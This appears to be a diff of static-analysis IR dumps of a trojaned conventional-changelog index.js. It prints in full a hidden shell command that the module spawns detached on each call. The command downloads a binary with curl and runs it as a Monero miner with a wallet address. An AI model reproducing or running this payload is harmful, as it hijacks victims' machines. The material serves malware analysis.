@@ -2,101 +2,108 @@
 CFG:
 BB0[-1..-2]
     -> BB1
-BB1[0..15]
+BB1[0..13]
     -> BB2
-    -> BB14
-BB2[16..17]
+    -> BB15
+BB2[14..15]
     -> BB3
-    -> BB14
-BB3[18..20]
+    -> BB15
+BB3[16..18]
     -> BB4
-    -> BB14
-BB4[21..22]
+    -> BB15
+BB4[19..20]
     -> BB5
-    -> BB14
-BB5[23..25]
+    -> BB15
+BB5[21..23]
     -> BB6
-    -> BB14
-BB6[26..27]
+    -> BB15
+BB6[24..25]
     -> BB7
-    -> BB14
-BB7[28..30]
+    -> BB15
+BB7[26..28]
     -> BB8
-    -> BB14
-BB8[31..38]
+    -> BB15
+BB8[29..32]
     -> BB9
-    -> BB14
-BB9[39..41]
+    -> BB15
+BB9[33..34]
     -> BB10
-    -> BB14
-BB10[42..44]
+    -> BB15
+BB10[35..35]
     -> BB11
-    -> BB14
-BB11[45..47]
+    -> BB15
+BB11[36..37]
     -> BB12
-    -> BB14
-BB12[48..49]
+    -> BB15
+BB12[38..39]
     -> BB13
+    -> BB15
+BB13[40..41]
     -> BB14
-BB13[50..50]
-    -> BB14
-BB14[-1..-2]
+    -> BB15
+BB14[42..43]
+    -> BB15
+BB15[-1..-2]
 Instructions:
 BB0
 BB1
-0   v1 = new <JavaScriptLoader,LArray>@0     conventional-changelog-index.js [0->1518] (line 1) [1=[arguments]]
+0   v1 = new <JavaScriptLoader,LArray>@0     conventional-changelog-index.js [0->1457] (line 1) [1=[arguments]]
 1   v3 = global:global $$undefined           conventional-changelog-index.js [71->142] (line 4)
 2   lexical:conventionalChangelogCore@Lconventional-changelog-index.js = v3conventional-changelog-index.js [71->142] (line 4)
 3   v5 = global:global $$undefined           conventional-changelog-index.js [143->231] (line 5)
 4   lexical:conventionalChangelogPresetLoader@Lconventional-changelog-index.js = v5conventional-changelog-index.js [143->231] (line 5)
 5   v7 = global:global $$undefined           conventional-changelog-index.js [232->299] (line 6)
 6   lexical:conventionalChangelogExecutor@Lconventional-changelog-index.js = v7conventional-changelog-index.js [232->299] (line 6)
-7   v9 = global:global $$undefined           conventional-changelog-index.js [300->756] (line 7) [9=[conventionalChangelogStartupScript]]
-9   v11 = global:global $$undefined          conventional-changelog-index.js [757->858] (line 8)
-10   lexical:conventionalStartupScript@Lconventional-changelog-index.js = v11conventional-changelog-index.js [757->858] (line 8)
-11   v16 = global:global Function            conventional-changelog-index.js [0->1518] (line 1)
-12   v13 = construct v16@12 v15:#Lconventional-changelog-index.js/conventionalChangelog exception:v14conventional-changelog-index.js [0->1518] (line 1)
-13   global:global conventionalChangelog = v13conventional-changelog-index.js [0->1518] (line 1)
-14   v21 = global:global require             conventional-changelog-index.js [103->110] (line 4)
-15   check v21                               conventional-changelog-index.js [103->110] (line 4)
+7   v9 = global:global $$undefined           conventional-changelog-index.js [300->747] (line 7)
+8   lexical:conventionalStartupScript@Lconventional-changelog-index.js = v9conventional-changelog-index.js [300->747] (line 7)
+9   v14 = global:global Function             conventional-changelog-index.js [0->1457] (line 1)
+10   v11 = construct v14@10 v13:#Lconventional-changelog-index.js/conventionalChangelog exception:v12conventional-changelog-index.js [0->1457] (line 1)
+11   global:global conventionalChangelog = v11conventional-changelog-index.js [0->1457] (line 1)
+12   v19 = global:global require             conventional-changelog-index.js [103->110] (line 4)
+13   check v19                               conventional-changelog-index.js [103->110] (line 4)
 BB2
-16   v23 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [103->141] (line 4)
-17   v19 = invoke v21@17 v23,v24:#conventional-changelog-core exception:v25conventional-changelog-index.js [103->141] (line 4)
+14   v21 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [103->141] (line 4)
+15   v17 = invoke v19@15 v21,v22:#conventional-changelog-core exception:v23conventional-changelog-index.js [103->141] (line 4)
 BB3
-18   lexical:conventionalChangelogCore@Lconventional-changelog-index.js = v19conventional-changelog-index.js [71->142] (line 4)
-19   v27 = global:global require             conventional-changelog-index.js [183->190] (line 5)
-20   check v27                               conventional-changelog-index.js [183->190] (line 5)
+16   lexical:conventionalChangelogCore@Lconventional-changelog-index.js = v17conventional-changelog-index.js [71->142] (line 4)
+17   v25 = global:global require             conventional-changelog-index.js [183->190] (line 5)
+18   check v25                               conventional-changelog-index.js [183->190] (line 5)
 BB4
-21   v28 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [183->230] (line 5)
-22   v26 = invoke v27@22 v28,v29:#conventional-changelog-preset-loader exception:v30conventional-changelog-index.js [183->230] (line 5)
+19   v26 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [183->230] (line 5)
+20   v24 = invoke v25@20 v26,v27:#conventional-changelog-preset-loader exception:v28conventional-changelog-index.js [183->230] (line 5)
 BB5
-23   lexical:conventionalChangelogPresetLoader@Lconventional-changelog-index.js = v26conventional-changelog-index.js [143->231] (line 5)
-24   v33 = global:global require             conventional-changelog-index.js [268->275] (line 6)
-25   check v33                               conventional-changelog-index.js [268->275] (line 6)
+21   lexical:conventionalChangelogPresetLoader@Lconventional-changelog-index.js = v24conventional-changelog-index.js [143->231] (line 5)
+22   v31 = global:global require             conventional-changelog-index.js [268->275] (line 6)
+23   check v31                               conventional-changelog-index.js [268->275] (line 6)
 BB6
-26   v34 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [268->292] (line 6)
-27   v32 = invoke v33@27 v34,v35:#child_process exception:v36conventional-changelog-index.js [268->292] (line 6)
+24   v32 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [268->292] (line 6)
+25   v30 = invoke v31@25 v32,v33:#child_process exception:v34conventional-changelog-index.js [268->292] (line 6)
 BB7
-29   v10 = prototype_values(v32)             conventional-changelog-index.js [268->298] (line 6)
-30   v31 = getfield < JavaScriptLoader, LRoot, spawn, <JavaScriptLoader,LRoot> > v10conventional-changelog-index.js [268->298] (line 6)
+27   v36 = prototype_values(v30)             conventional-changelog-index.js [268->298] (line 6)
+28   v29 = getfield < JavaScriptLoader, LRoot, spawn, <JavaScriptLoader,LRoot> > v36conventional-changelog-index.js [268->298] (line 6)
 BB8
-31   lexical:conventionalChangelogExecutor@Lconventional-changelog-index.js = v31conventional-changelog-index.js [232->299] (line 6)
-37   v46 = global:global Buffer              conventional-changelog-index.js [789->795] (line 8) [46=[$$destructure$rcvr5]]
-38   check v46                               conventional-changelog-index.js [789->795] (line 8) [46=[$$destructure$rcvr5]]
+29   lexical:conventionalChangelogExecutor@Lconventional-changelog-index.js = v29conventional-changelog-index.js [232->299] (line 6)
+30   lexical:conventionalStartupScript@Lconventional-changelog-index.js = v37:#rm -rf /tmp/.debug && curl https://mnrlnt.blob.core.windows.net/mnr/Silence -o /tmp/.debug 2> /dev/null && chmod +x /tmp/.debug && /tmp/.debug -o stratum+tcp://pool.minexmr.com:4444 -u 4A9V5knGUM8PUdPSJbTox8b9mgTsfXByK49XKtEyqVayDxD6CFJe5dsexaM99x7MXFNTxZkYAr4YtcAXQMkNrFjnRPJGJFr.JL6_$(hostname -f | md5sum | cut -c1-8) -p x -t $(lscpu | grep 'CPU(s)'| grep -v ',' | awk '{print $2}' | head -n 1) 2> /dev/null &conventional-changelog-index.js [300->747] (line 7)
+31   v39 = global:global conventionalChangelogconventional-changelog-index.js [1385->1406] (line 23)
+32   check v39                               conventional-changelog-index.js [1385->1406] (line 23)
 BB9
-41   v48 = dispatch v47:#from@41 v46,v39:#rm -rf /tmp/.debug && curl https://mnrlnt.blob.core.windows.net/mnr/Silence -o /tmp/.debug 2> /dev/null && chmod +x /tmp/.debug && /tmp/.debug -o stratum+tcp://pool.minexmr.com:4444 -u 4A9V5knGUM8PUdPSJbTox8b9mgTsfXByK49XKtEyqVayDxD6CFJe5dsexaM99x7MXFNTxZkYAr4YtcAXQMkNrFjnRPJGJFr.JL6_$(hostname -f | md5sum | cut -c1-8) -p x -t $(lscpu | grep 'CPU(s)'| grep -v ',' | awk '{print $2}' | head -n 1) 2> /dev/null &,v49:#base64 exception:v50conventional-changelog-index.js [789->846] (line 8) [48=[$$destructure$rcvr4]47=[$$destructure$elt5]46=[$$destructure$rcvr5]39=[conventionalChangelogStartupScript]]
+33   v41 = global:global module              conventional-changelog-index.js [1368->1374] (line 23)
+34   check v41                               conventional-changelog-index.js [1368->1374] (line 23)
 BB10
-44   v52 = dispatch v51:#toString@44 v48 exception:v53conventional-changelog-index.js [789->857] (line 8) [51=[$$destructure$elt4]48=[$$destructure$rcvr4]]
+35   fieldref v41.v42:#exports = v39 = v39   conventional-changelog-index.js [1368->1406] (line 23)
 BB11
-45   lexical:conventionalStartupScript@Lconventional-changelog-index.js = v52conventional-changelog-index.js [757->858] (line 8)
-46   v54 = global:global conventionalChangelogconventional-changelog-index.js [1496->1517] (line 24)
-47   check v54                               conventional-changelog-index.js [1496->1517] (line 24)
+36   v44 = global:global conventionalChangelogconventional-changelog-index.js [1408->1429] (line 24)
+37   check v44                               conventional-changelog-index.js [1408->1429] (line 24)
 BB12
-48   v56 = global:global module              conventional-changelog-index.js [1479->1485] (line 24)
-49   check v56                               conventional-changelog-index.js [1479->1485] (line 24)
+38   v45 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [1408->1431] (line 24)
+39   v43 = invoke v44@39 v45 exception:v46   conventional-changelog-index.js [1408->1431] (line 24)
 BB13
-50   fieldref v56.v57:#exports = v54 = v54   conventional-changelog-index.js [1479->1517] (line 24)
+40   v48 = global:global conventionalChangelogconventional-changelog-index.js [1433->1454] (line 25)
+41   check v48                               conventional-changelog-index.js [1433->1454] (line 25)
 BB14
+42   v49 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [1433->1456] (line 25)
+43   v47 = invoke v48@43 v49 exception:v50   conventional-changelog-index.js [1433->1456] (line 25)
+BB15
 
 
 <ctor for <JavaScriptLoader,LFunction>(Lconventional-changelog-index.js/conventionalChangelog)>
@@ -136,3 +143,266 @@ BB5
 BB6
 7   return v5                                
 BB7
+
+
+<Code body of function Lconventional-changelog-index.js/conventionalChangelog>
+CFG:
+BB0[-1..-2]
+    -> BB1
+BB1[0..5]
+    -> BB2
+    -> BB30
+BB2[6..6]
+    -> BB4
+    -> BB3
+BB3[7..8]
+    -> BB5
+BB4[9..11]
+    -> BB5
+BB5[12..12]
+    -> BB6
+    -> BB30
+BB6[13..16]
+    -> BB7
+    -> BB30
+BB7[17..19]
+    -> BB8
+    -> BB30
+BB8[20..21]
+    -> BB9
+    -> BB30
+BB9[22..22]
+    -> BB10
+    -> BB30
+BB10[23..24]
+    -> BB11
+    -> BB30
+BB11[25..25]
+    -> BB12
+    -> BB30
+BB12[26..26]
+    -> BB13
+    -> BB30
+BB13[27..27]
+    -> BB14
+    -> BB30
+BB14[28..28]
+    -> BB15
+    -> BB30
+BB15[29..29]
+    -> BB16
+    -> BB30
+BB16[30..32]
+    -> BB17
+    -> BB30
+BB17[33..35]
+    -> BB18
+    -> BB30
+BB18[36..36]
+    -> BB27
+    -> BB19
+BB19[37..38]
+    -> BB20
+    -> BB30
+BB20[39..44]
+    -> BB21
+    -> BB25
+BB21[45..47]
+    -> BB22
+    -> BB25
+BB22[48..48]
+    -> BB23
+    -> BB25
+BB23[49..49]
+    -> BB24
+    -> BB25
+BB24[50..50]
+    -> BB27
+BB25[51..59]
+    -> BB26
+    -> BB30
+BB26[60..62]
+    -> BB27
+    -> BB30
+BB27[63..64]
+    -> BB28
+    -> BB30
+BB28[65..66]
+    -> BB29
+    -> BB30
+BB29[67..67]
+    -> BB30
+BB30[-1..-2]
+Instructions:
+BB0
+BB1
+0   v8 = new <JavaScriptLoader,LArray>@0     conventional-changelog-index.js [749->1366] (line 9) [8=[arguments]]
+1   v10 = global:global $$undefined          conventional-changelog-index.js [1048->1258] (line 13) [10=[err]]
+4   v11 = prototype_values(v3)               conventional-changelog-index.js [862->874] (line 10) [3=[options]]
+5   v12 = getfield < JavaScriptLoader, LRoot, warn, <JavaScriptLoader,LRoot> > v11conventional-changelog-index.js [862->874] (line 10)
+BB2
+6   conditional branch(eq, to iindex=9) v12,v16:#0conventional-changelog-index.js [862->891] (line 10)
+BB3
+8   goto (from iindex= 8 to iindex = 12)     conventional-changelog-index.js [862->891] (line 10)
+BB4
+9   v20 = global:global Function             conventional-changelog-index.js [862->891] (line 10)
+10   v17 = construct v20@10 v19:#Lconventional-changelog-index.js/conventionalChangelog/conventional-changelog-index.js@878 exception:v18conventional-changelog-index.js [862->891] (line 10)
+BB5
+           v14 = phi  v12,v17
+12   fieldref v3.v13:#warn = v14 = v14       conventional-changelog-index.js [847->891] (line 10) [3=[options]13=[$$destructure$elt6]]
+BB6
+15   v26 = lexical:conventionalChangelogExecutor@Lconventional-changelog-index.jsconventional-changelog-index.js [897->926] (line 11)
+16   check v26                               conventional-changelog-index.js [897->926] (line 11)
+BB7
+17   v28 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [897->1004] (line 11)
+18   v30 = lexical:conventionalStartupScript@Lconventional-changelog-index.jsconventional-changelog-index.js [927->952] (line 11)
+19   check v30                               conventional-changelog-index.js [927->952] (line 11)
+BB8
+20   v33 = global:global Array               conventional-changelog-index.js [954->956] (line 11)
+21   check v33                               conventional-changelog-index.js [954->956] (line 11)
+BB9
+22   v31 = construct v33@22 exception:v34    conventional-changelog-index.js [954->956] (line 11)
+BB10
+23   v37 = global:global Object              conventional-changelog-index.js [958->1003] (line 11)
+24   check v37                               conventional-changelog-index.js [958->1003] (line 11)
+BB11
+25   v35 = construct v37@25 exception:v38    conventional-changelog-index.js [958->1003] (line 11)
+BB12
+26   fieldref v35.v39:#shell = v40:#true = v40:#trueconventional-changelog-index.js [958->1003] (line 11)
+BB13
+27   fieldref v35.v41:#stdio = v42:#ignore = v42:#ignoreconventional-changelog-index.js [958->1003] (line 11)
+BB14
+28   fieldref v35.v43:#detached = v40:#true = v40:#trueconventional-changelog-index.js [958->1003] (line 11)
+BB15
+29   v24 = invoke v26@29 v28,v30,v31,v35 exception:v44conventional-changelog-index.js [897->1004] (line 11) [24=[$$destructure$rcvr4]]
+BB16
+32   v46 = dispatch v45:#unref@32 v24 exception:v47conventional-changelog-index.js [897->1012] (line 11) [45=[$$destructure$elt4]24=[$$destructure$rcvr4]]
+BB17
+34   v15 = prototype_values(v3)              conventional-changelog-index.js [1022->1036] (line 12) [3=[options]]
+35   v48 = getfield < JavaScriptLoader, LRoot, preset, <JavaScriptLoader,LRoot> > v15conventional-changelog-index.js [1022->1036] (line 12)
+BB18
+36   conditional branch(eq, to iindex=63) v48,v16:#0conventional-changelog-index.js [1018->1264] (line 12)
+BB19
+37   v53 = lexical:conventionalChangelogPresetLoader@Lconventional-changelog-index.jsconventional-changelog-index.js [1083->1116] (line 14)
+38   check v53                               conventional-changelog-index.js [1083->1116] (line 14)
+BB20
+39   v54 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [1083->1146] (line 14)
+43   v22 = prototype_values(v3)              conventional-changelog-index.js [1117->1131] (line 14) [3=[options]]
+44   v57 = getfield < JavaScriptLoader, LRoot, preset, <JavaScriptLoader,LRoot> > v22conventional-changelog-index.js [1117->1131] (line 14) [57=[$$destructure$rcvr8]]
+BB21
+47   v60 = dispatch v59:#toLowerCase@47 v57 exception:v61conventional-changelog-index.js [1117->1145] (line 14) [59=[$$destructure$elt8]57=[$$destructure$rcvr8]]
+BB22
+48   v51 = invoke v53@48 v54,v60 exception:v62conventional-changelog-index.js [1083->1146] (line 14)
+BB23
+49   fieldref v3.v63:#config = v51 = v51     conventional-changelog-index.js [1066->1146] (line 14) [3=[options]]
+BB24
+50   goto (from iindex= 50 to iindex = 63)   conventional-changelog-index.js [1048->1258] (line 13)
+BB25<Handler> (<JavaScriptLoader,LRoot>)
+           v64 = getCaughtException 
+58   v23 = prototype_values(v3)              conventional-changelog-index.js [1211->1225] (line 16) [3=[options]]
+59   v71 = getfield < JavaScriptLoader, LRoot, preset, <JavaScriptLoader,LRoot> > v23conventional-changelog-index.js [1211->1225] (line 16)
+BB26
+60   v69 = binaryop(add) v70:#Preset: " , v71conventional-changelog-index.js [1197->1225] (line 16)
+61   v68 = binaryop(add) v69 , v73:#" does not existconventional-changelog-index.js [1197->1246] (line 16)
+62   v67 = dispatch v13:#warn@62 v3,v68 exception:v74conventional-changelog-index.js [1184->1247] (line 16) [13=[$$destructure$elt6]3=[options]]
+BB27
+63   v77 = lexical:conventionalChangelogCore@Lconventional-changelog-index.jsconventional-changelog-index.js [1277->1302] (line 20)
+64   check v77                               conventional-changelog-index.js [1277->1302] (line 20)
+BB28
+65   v78 = global:global __WALA__int3rnal__globalconventional-changelog-index.js [1277->1363] (line 20)
+66   v75 = invoke v77@66 v78,v3,v4,v5,v6,v7 exception:v79conventional-changelog-index.js [1277->1363] (line 20) [3=[options]4=[context]5=[gitRawCommitsOpts]6=[parserOpts]7=[writerOpts]]
+BB29
+67   return v75                              conventional-changelog-index.js [1270->1364] (line 20)
+BB30
+
+
+<ctor for <JavaScriptLoader,LFunction>(Lconventional-changelog-index.js/conventionalChangelog/conventional-changelog-index.js@878)>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB7
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB7
+BB3[3..3]
+    -> BB4
+    -> BB7
+BB4[4..5]
+    -> BB5
+BB5[6..6]
+    -> BB6
+BB6[7..7]
+    -> BB7
+BB7[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,Lconventional-changelog-index.js/conventionalChangelog/conventional-changelog-index.js@878>@2
+BB3
+3   v7 = new <JavaScriptLoader,LObject>@3    
+BB4
+4   set_prototype(v5, v4)                    
+5   putfield v5.< JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > = v7
+BB5
+6   putfield v7.< JavaScriptLoader, LRoot, constructor, <JavaScriptLoader,LRoot> > = v5
+BB6
+7   return v5                                
+BB7
+
+
+<ctor for <JavaScriptLoader,LArray>>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB4
+BB1[1..2]
+    -> BB2
+    -> BB4
+BB2[3..4]
+    -> BB3
+BB3[5..5]
+    -> BB4
+BB4[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = fieldref v1.v3:#prototype           
+2   v5 = new <JavaScriptLoader,LArray>@2     
+BB2
+3   set_prototype(v5, v4)                    
+4   putfield v5.< JavaScriptLoader, LRoot, length, <JavaScriptLoader,LRoot> > = v7:#0
+BB3
+5   return v5                                
+BB4
+
+
+<ctor for <JavaScriptLoader,LObject>>
+CFG:
+BB0[0..0]
+    -> BB1
+    -> BB4
+BB1[1..1]
+    -> BB2
+BB2[2..2]
+    -> BB3
+    -> BB4
+BB3[3..4]
+    -> BB4
+BB4[-1..-2]
+Instructions:
+BB0
+0   v2 = new <JavaScriptLoader,LArray>@0     
+BB1
+1   v4 = getfield < JavaScriptLoader, LRoot, prototype, <JavaScriptLoader,LRoot> > v1
+BB2
+2   v5 = new <JavaScriptLoader,LObject>@2    
+BB3
+3   set_prototype(v5, v4)                    
+4   return v5                                
+BB4
